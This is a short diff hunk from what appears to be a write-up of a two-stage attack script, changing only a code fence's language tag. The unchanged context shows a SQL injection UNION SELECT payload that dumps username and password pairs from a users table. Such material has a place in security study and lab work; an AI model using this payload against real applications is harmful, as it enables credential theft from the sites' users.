@@ -60,6 +60,6 @@ The script has 2 stages:
   now leaking username + password pairs
 
   payload
-  ```
+  ```sql
   ' UNION SELECT 1, group_concat(username || ':' || password, ';'), 3 FROM users --
   ```
